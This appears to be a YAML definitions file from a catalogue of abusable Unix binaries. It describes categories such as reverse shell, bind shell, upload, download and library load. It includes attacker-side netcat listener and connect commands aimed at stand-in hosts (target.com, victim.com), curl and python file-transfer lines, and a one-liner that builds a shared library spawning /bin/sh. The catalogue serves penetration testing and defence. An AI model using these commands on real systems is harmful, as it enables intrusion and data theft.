shell:
  label: Shell
  description: This executable can spawn an interactive system shell.
  extra:
    blind: &blind
      true: The commands are executed but their output is hidden from the attacker.

command:
  label: Command
  description: This executable can run non-interactive system commands.
  extra:
    blind: *blind

reverse-shell:
  label: Reverse shell
  description: This executable can send back a reverse system shell to a listening attacker.
  extra:
    tty: &tty
      false: The spawned shell is just a dummy REPL that can only run simple terminal commands.
    blind: *blind
    listener:
      tcp-server:
        comment: A TCP server can be used on the attacker box to receive the shell.
        code: nc -l -p 12345

bind-shell:
  label: Bind shell
  description: This executable can bind a system shell to a local port waiting for an attacker to connect.
  extra:
    tty: *tty
    blind: *blind
    connector:
      tcp-client:
        comment: A TCP client can be used on the attacker box to connect to the shell.
        code: nc target.com 12345

file-write:
  label: File write
  description: This executable can write data to local files.
  extra:
    binary: &binary
      false: The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data.

file-read:
  label: File read
  description: This executable can read data from local files.
  extra:
    binary: *binary

upload:
  label: Upload
  description: This executable can upload local data.
  extra:
    binary: *binary
    receiver:
      tcp-client:
        comment: A TCP client can be used on the attacker box to receive the data.
        code: nc victim.com 12345 >/path/to/output-file
      tcp-server:
        comment: A TCP server can be used on the attacker box to receive the data.
        code: nc -l -p 12345 >/path/to/output-file
      http-client:
        comment: An HTTP client can be used on the attacker box to receive the data.
        code: curl victim.com -o /path/to/output-file
      http-server:
        comment: An HTTP server can be used on the attacker box to receive the data.
        code: nc -l -p 80 | awk 'BEGIN {RS="\r\n\r\n";ORS=""} NR==2' >/path/to/output-file

download:
  label: Download
  description: This executable can download remote data.
  extra:
    binary: *binary
    sender:
      tcp-client:
        comment: A TCP client can be used on the attacker box to send the data.
        code: nc victim.com 12345 </path/to/input-file
      tcp-server:
        comment: A TCP server can be used on the attacker box to send the data.
        code: nc -l -p 12345 </path/to/input-file
      http-client:
        comment: An HTTP client can be used on the attacker box to send the data.
        code: curl victim.com --data-binary @/path/to/input-file
      http-server:
        comment: An HTTP server can be used on the attacker box to send the data.
        code: python -m http.server 80

library-load:
  label: Library load
  description: This executable can load shared libraries that may be used to run arbitrary code in the same execution context.
  extra:
    payload: |-
      As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:

      ```
      echo '__attribute__((constructor)) init() { execl("/bin/sh", "sh", 0); }' \
          | gcc -w -fPIC -shared -o lib.so -x c -
      ```

inherit:
  label: Inherit
  description: This executable can inherit functions from another.
